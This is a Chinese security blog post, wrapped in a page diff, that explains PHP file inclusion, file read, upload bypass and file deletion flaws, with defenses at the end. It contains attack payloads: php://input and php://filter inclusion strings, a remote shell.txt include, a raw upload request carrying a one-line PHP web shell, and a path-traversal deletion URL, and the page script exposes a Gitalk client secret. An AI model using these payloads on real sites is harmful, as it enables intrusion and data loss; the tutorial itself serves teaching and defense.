@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>文件操作 - Scorpio</title>
+  <meta charset="UTF-8">
+  <meta name="description" content="每个人都应该拥有自己的梦想">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/favicon.ico" type="image/png">
+  <meta name="description" content="文件操作(文件包含、文件读取、文件删除)">
+<meta name="keywords" content="PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件操作">
+<meta property="og:url" content="https://www.Gsuhy.cn/2018/02/05/文件操作/index.html">
+<meta property="og:site_name" content="Scorpio">
+<meta property="og:description" content="文件操作(文件包含、文件读取、文件删除)">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-08-27T06:57:30.911Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="文件操作">
+<meta name="twitter:description" content="文件操作(文件包含、文件读取、文件删除)">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1566894167678">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(https://i.loli.net/2019/01/13/5c3aec85a4343.jpg)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="Gsuhy" class="mdui-btn mdui-btn-icon"><img src="/images/avatar.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Gsuhy">
+            <img src="/images/avatar.png" alt="Gsuhy">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>30</div>
+        <div><span>标签</span>15</div>
+        <div><span>分类</span>13</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://space.bilibili.com/20238211" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
+            <i class="nexmoefont icon-bilibili"></i>
+        </a><a class="mdui-ripple" href="https://github.com/nexmoe/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CTF/">CTF</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/JAVA/">JAVA</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/JSP/">JSP</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Link/">Link</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Linux/">Linux</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Nginx/">Nginx</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/PHP/">PHP</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Python/">Python</a>
+          <span class="category-list-count">11</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/SQL/">SQL</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/内网渗透/">内网渗透</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/前端/">前端</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/学习/">学习</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/生活/">生活</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 12.5px;">CTF</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/Nginx/" style="font-size: 12.5px;">Nginx</a> <a href="/tags/PHP/" style="font-size: 17.5px;">PHP</a> <a href="/tags/WP/" style="font-size: 10px;">WP</a> <a href="/tags/jSP/" style="font-size: 10px;">jSP</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/scrapy/" style="font-size: 10px;">scrapy</a> <a href="/tags/sites/" style="font-size: 10px;">sites</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/生活/" style="font-size: 10px;">生活</a>
+    </div>
+    
+  </div>
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">四月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">三月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">二月 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2019 Gsuhy
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="https://i.loli.net/2019/01/13/5c3aec85a4343.jpg">
+        
+        <h1>文件操作</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2018年02月05日</a>
+    <a><i class="nexmoefont icon-areachart"></i>2.2k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 9 分钟</a>
+    
+      <a class="nexmoefont icon-appstore-fill -link" href="/categories/PHP/">PHP</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/PHP/">PHP</a>
+    
+  </div>
+  <article>
+    <p>文件操作(文件包含、文件读取、文件删除)<a id="more"></a></p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h3 id="简述-amp-amp-amp-原理"><a href="#简述-amp-amp-amp-原理" class="headerlink" title="简述&amp;&amp;&amp;原理"></a>简述&amp;&amp;&amp;原理</h3><p>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行以及敏感信息的泄露，主要包括本地文件和远程文件包含。文件包含是php脚本的一大特色，程序员们为了开发的方便，常常会用到包含。比如把一系列功能函数都写进fuction.php中，之后当某个文件需要调用的时候就直接在文件头中写上一句<?php include fuction.php?>就可以调用内部定义的函数。</p>
+<h3 id="常见包含函数：include-require"><a href="#常见包含函数：include-require" class="headerlink" title="常见包含函数：include(),require()"></a>常见包含函数：include(),require()</h3><p>区别：</p>
+<ul>
+<li>include是当代码执行到他的时候才加载文件，发生错误的时候只是发出警告，但仍然继续执行</li>
+<li>require是只要执行就会立即调用文件，发生错误的时候会报错，并且终止脚本的运行<br>require一般是用于<code>文件头包含类文件、数据库</code>等等文件。。。而include一般是用于包含<code>html</code>模板文件</li>
+</ul>
+<h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><h4 id="1-包含目录文件"><a href="#1-包含目录文件" class="headerlink" title="1.包含目录文件"></a>1.包含目录文件</h4><p>？f=text.txt<br>如果里面的内容是php，则继续当成php执行，如果不是php则会读取文件内容<br>？f=./../text.txt<br><code>./</code>是当前目录<code>../</code>是上一级目录。这样来遍历目录来读取文件</p>
+<h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><h5 id="1-远程代码执行："><a href="#1-远程代码执行：" class="headerlink" title="1.远程代码执行："></a>1.远程代码执行：</h5><p>?file=[http|https|ftp]://example.com/shell.txt</p>
+<h5 id="2-利用php流input-接受POST过来的值-："><a href="#2-利用php流input-接受POST过来的值-：" class="headerlink" title="2.利用php流input(接受POST过来的值)："></a>2.利用php流input(接受POST过来的值)：</h5><p>?file=php://input<br>eg</p>
+<pre><code>http://192.168.227.128/other/lfi/ex1.php?f=php://input
+&lt;?php phpinfo();?&gt;(ps.经过post)</code></pre><h5 id="3-利用php流filter"><a href="#3-利用php流filter" class="headerlink" title="3.利用php流filter"></a>3.利用php流filter</h5><p>php://filter是一种元封装器， 设计用于数据流打开时的筛选过滤应用。<br>include “test.php” php文件包含，在执行流中插入写在其他文件中的有用的代码。读取的时候也是数据流形式，因此可以使用php://filter进行过滤，返回值为0,1。<br>readfile(“test.php”)是将文件以数据流的形式取过来，并不会执行，但会在前台浏览器上进行解析。返回值是字节数多少。<br><code>?file=php://filter/convert.base64-encode/resource=index.php</code></p>
+<h4 id="这里就可以顺带提一下php-输入输出流"><a href="#这里就可以顺带提一下php-输入输出流" class="headerlink" title="这里就可以顺带提一下php://输入输出流"></a>这里就可以顺带提一下php://输入输出流</h4><p>PHP提供了php://的协议允许访问PHP的输入输出流、标准输入输出流和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。提供一些访问方式来使用这些封装器</p>
+<pre><code>php://stdin
+php://stdout
+php://stderr
+php://input(访问请求的原始数据的只读流，也就是可以直接读取到POST上没有经过解析的原始数据)
+php://output(与input相反，是一个只写的数据流)
+php://fd
+php://memory
+php://temp
+php://filter(文件操作的协议，可以对磁盘中的文件镜像读写操作，就类似于readfile()函数的效果)</code></pre><h3 id="文件包含截断"><a href="#文件包含截断" class="headerlink" title="文件包含截断"></a>文件包含截断</h3><ul>
+<li>%00截断<br>这是一种古老的方法- -。。%00截断受限于GPC和addslashes等函数的过滤，也就是说在开启GPC的情况下是行不通的。而且据说在php5.3之后的版本已经修复了这个东西。不过在一些CTF比赛中还是有出现的。</li>
+<li>用多个.和/来截断<h3 id="文件读取-下载"><a href="#文件读取-下载" class="headerlink" title="文件读取/下载"></a>文件读取/下载</h3>这个漏洞就是在部分程序在下载文件或者读取文件的时候，读取文件参数filename直接在请求里面传递，后台程序获取这个文件路径后<br>直接读取返回，问题就在于这个参数是用户可控的，可以直接传入想要读取的文件路径，然后就可以利用。<h3 id="挖掘方法"><a href="#挖掘方法" class="headerlink" title="挖掘方法"></a>挖掘方法</h3></li>
+<li>直接找一些关键的函数：<code>file_get_contents()、
+highlight_file() 、fopen()、readfile()、fread()、fgetss()、parse_ini_file()、show_source()、file()</code></li>
+<li>如果有文件包含的函数比如include，就可以用php输出输入流<code>php://filter/</code>来读取文件。</li>
+</ul>
+<h4 id="有一个不明所以的栗子"><a href="#有一个不明所以的栗子" class="headerlink" title="有一个不明所以的栗子"></a>有一个不明所以的栗子</h4><p>是phpcms v9的一个任意文件读取漏洞代码是这样的</p>
+<pre><code>public function public_get_suggest_keyword(){
+     $url=$_GET[&#39;url&#39;].&#39;&amp;q=&#39;.$_GET[&#39;url&#39;];
+     $res=@file_get_contents($url);
+     if(CHARSET!=&#39;gbk&#39;){
+        $res=iconv(&#39;gbk&#39;,CHARSET,$res);
+     }
+     echo $res;
+}</code></pre><p>这个大概的意思就是函数<code>get_suggest_keyword</code>直接从GET参数里面获取url，然后又用文件读取函数读取内容。</p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>看起来文件上传应该是最简单的一个，因为一般可以上传文件的地方比较少，然后什么什么大多web应用都是基于框架来写的，上传的点调用的是同一个上传类，上传函数又只有<code>move_uploaded_file()</code>一个，所以在审计的时候直接找这个函数就行了。</p>
+<h4 id="未过滤或者本地过滤"><a href="#未过滤或者本地过滤" class="headerlink" title="未过滤或者本地过滤"></a>未过滤或者本地过滤</h4><p>其实两个都有一个共同点，就是都是在服务器端未过滤，就是没有限制任何格式的文件上传</p>
+<h4 id="黑名单扩展名过滤"><a href="#黑名单扩展名过滤" class="headerlink" title="黑名单扩展名过滤"></a>黑名单扩展名过滤</h4><p>我觉得就是进行一些限制，定义不能上传的文件扩展名，但是我觉得，总会有过滤不完的时候hhhhhhh<br>在CSDN上找到一些黑名单过滤的代码</p>
+<pre><code>&lt;?php  
+    $BlackList = array(&#39;asp&#39;,&#39;php&#39;,&#39;jsp&#39;,&#39;php5&#39;,&#39;asa&#39;,&#39;aspx&#39;);//黑名单  
+    if (isset($_POST[&quot;submit&quot;])){  
+        $name = $_FILES[&#39;file&#39;][&#39;name&#39;]; //接收文件名  
+        echo $name;  
+        $extension = substr(strrchr($name,&quot;.&quot;),1);//得到扩展名  
+        $boo = false;  
+
+        foreach ($BlackList as $key=&gt;$value){  
+            if ($value==$extension){//迭代判断是否有命中  
+                $boo=true;  
+                break;//命中之后直接退出循环  
+            }  
+        }  
+
+        if(!$boo){//如果没有命中，则开始文件上传操作  
+            $size=$_FILES[&#39;file&#39;][&#39;size&#39;];//接收文件大小  
+            $tmp=$_FILES[&#39;file&#39;][&#39;tmp_name&#39;];//临时路径  
+            move_uploaded_file($tmp,$name);//移动临时文件到当前文件目录  
+            echo &quot;文件上传成功！&lt;br/&gt; path:&quot;.$name;  
+        }else {  
+            echo &quot;文件不合法！！&quot;;  
+        }  
+
+    }  
+?&gt;</code></pre><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
+<li>限制扩展名不够全比如在IIS下执行ASP代码，有很多扩展名，什么.asp啊、cdx、asa、cer。</li>
+<li>可以结合PHP和系统特性来截断文件名从而绕过，像上面%00截断之类的。</li>
+</ul>
+<h3 id="文件头、content-type验证绕过"><a href="#文件头、content-type验证绕过" class="headerlink" title="文件头、content-type验证绕过"></a>文件头、content-type验证绕过</h3><p>听说这两种方法挺早的<br>程序靠一些不可靠的函数来验证是不是图片文件，比如<code>getimagesize()</code>，只要文件头是“GIF89a”就会返回一个图片尺寸的数组，就可以上传<br>content-type是在http request请求头里面<br>假如服务端上的upload.php 代码如下</p>
+<pre><code>&lt;?php
+if($_FILES[&#39;userfile&#39;][&#39;type&#39;] != &quot;image/gif&quot;) { //检测Content-type
+echo &quot;Sorry, we only allow uploading GIF images&quot;;
+exit;
+}
+$uploaddir = &#39;uploads/&#39;;
+$uploadfile = $uploaddir . basename($_FILES[&#39;userfile&#39;][&#39;name&#39;]);
+if (move_uploaded_file($_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;], $uploadfile)) {
+echo &quot;File is valid, and was successfully uploaded.\n&quot;;
+} else {
+echo &quot;File uploading failed.\n&quot;;
+}
+?&gt;</code></pre><p>然后我们可以将request 包的Content-Type 修改</p>
+<pre><code>POST /upload.php HTTP/1.1
+TE: deflate,gzip;q=0.3
+Connection: TE, close
+Host: localhost
+User-Agent: libwww-perl/5.803
+Content-Type: multipart/form-data; boundary=xYzZY
+Content-Length: 155
+--xYzZY
+Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;shell.php&quot;
+Content-Type: image/gif (原为Content-Type: text/plain)
+&lt;?php system($_GET[&#39;command&#39;]);?&gt;
+--xYzZY--
+HTTP/1.1 200 OK
+Date: Thu, 31 May 2007 14:02:11 GMT
+Server: Apache
+X-Powered-By: PHP/4.4.4-pl6-gentoo
+Content-Length: 59
+Connection: close
+Content-Type: text/html
+&lt;pre&gt;File is valid, and was successfully uploaded.&lt;/pre&gt;</code></pre><p>像这种服务端检测HTTP 包的Content-Type 都可以用这种类似的方法来绕过检测<br>在网上发现两个比较详细的文件上传验证绕过的文章<a href="http://blog.csdn.net/ncafei/article/details/53401961" target="_blank" rel="noopener">click1</a>   <a href="http://blog.csdn.net/szuaurora/article/details/66475824" target="_blank" rel="noopener">click2</a></p>
+<h3 id="文件删除漏洞"><a href="#文件删除漏洞" class="headerlink" title="文件删除漏洞"></a>文件删除漏洞</h3><p>一些有文件管理功能的应用上比较多，同时这些应用肯定也有文件上传和读取，原理跟文件读取漏洞是差不多的，只是函数不一样<code>unlink()</code>还是来个栗子分析一哈嘛，是一个企业的内容管理系统漏洞。</p>
+<pre><code>if($action==&#39;delete&#39;){
+    if(if_array($filenames)){
+        foreach($filenames as $filename){
+            if(fileext($filename)==&#39;sql&#39;){
+                @unlink(&#39;../databack/&#39;.$filename);
+            }
+        }
+    }else{
+        if(fileext($filenames)==&#39;sql&#39;){
+            $filenamearray=explode(&quot;.sql&quot;,$filenames);
+            @unlink(&#39;../../databack/&#39;.$filenames);
+            @unlink(&#39;../../databack/sql/metinfo_&#39;.$filenamearray[0].&quot;.zip&quot;);
+        }else{
+        //如果不是sql文件，直接删除
+            @unlink(&#39;../../databack/&#39;.$fileon.&#39;/&#39;.$filenames);
+        }
+    }
+</code></pre><p>首先判断请求的action参数是不是delete，如果是就进入文件删除功能，然后后面在判断是不是sql文件，如果不是就直接在databack目录删除提交的文件名，然后$filenames函数从GET中提交，直接请求<code>?&amp;action=delete&amp;filenames=../../index.php</code>就可以删除index.php文件。</p>
+<h3 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h3><h4 id="文件上传漏洞防范"><a href="#文件上传漏洞防范" class="headerlink" title="文件上传漏洞防范"></a>文件上传漏洞防范</h4><ul>
+<li>白名单方法过滤文件扩展名，用in_array或者===来对比扩展名</li>
+<li>保存上传的文件是重命名文件，文件名命名规则用时间戳的拼接随机数的md5方式<code>&quot;md5(time()+rand(1,1000))&quot;</code></li>
+</ul>
+
+  </article>
+  
+    
+<div class="nexmoe-post-copyright">
+<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+<strong>本文作者：</strong>Gsuhy<br>
+<strong>本文链接：</strong><a href="https://www.Gsuhy.cn/2018/02/05/文件操作/" title="https://www.Gsuhy.cn/2018/02/05/文件操作/" target="_blank" rel="noopener">https://www.Gsuhy.cn/2018/02/05/文件操作/</a><br>
+
+  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+</div>
+
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1566894167684"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
+
+  
+
+
+
+
+
+</body>
+
+</html>
